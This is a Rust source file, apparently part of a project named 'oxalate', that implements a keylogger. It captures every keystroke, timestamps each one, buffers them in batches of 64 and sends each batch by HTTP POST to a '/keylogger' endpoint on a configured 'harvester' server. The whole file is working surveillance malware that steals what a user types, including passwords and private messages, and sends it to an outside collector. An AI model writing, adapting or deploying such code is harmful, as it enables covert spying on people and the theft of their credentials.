use chrono::Utc;
use log::{error, info};
use oxalate_keylogger::spawn_keylogger;
use reqwest::Client;

use crate::HARVESTER_URL;

use oxalate_schemas::harvester::public::keylogger::post_keylogger::{Key, Req};

const KEY_BUFFERING: usize = 64;

pub fn keylogger(reqwest_client: Client) {
    let mut rx = spawn_keylogger();
    tokio::spawn(async move {
        let mut req = Req(Vec::with_capacity(KEY_BUFFERING));
        loop {
            if req.0.len() >= KEY_BUFFERING {
                let res = reqwest_client
                    .post(format!("http://{}/keylogger", *HARVESTER_URL))
                    .json::<Req>(&req)
                    .send()
                    .await;
                match res {
                    Ok(e) if e.status() == 200 => {
                        info!("send keylogs to /keylogger");
                        req.0.clear();
                    }
                    Ok(e) => {
                        let status = e.status();
                        let body = e.text().await.unwrap();
                        info!(
                            "failed sending keylogs with status code: {}, and body: {}",
                            status, body
                        )
                    }
                    Err(err) => error!("failed to send keystrokes: {err}"),
                }
            }

            let key = rx.recv().await.unwrap();
            let now = Utc::now().naive_utc();
            let key = Key {
                at: now,
                key_pressed: format!("{key:?}"),
            };
            req.0.push(key);
        }
    });
}
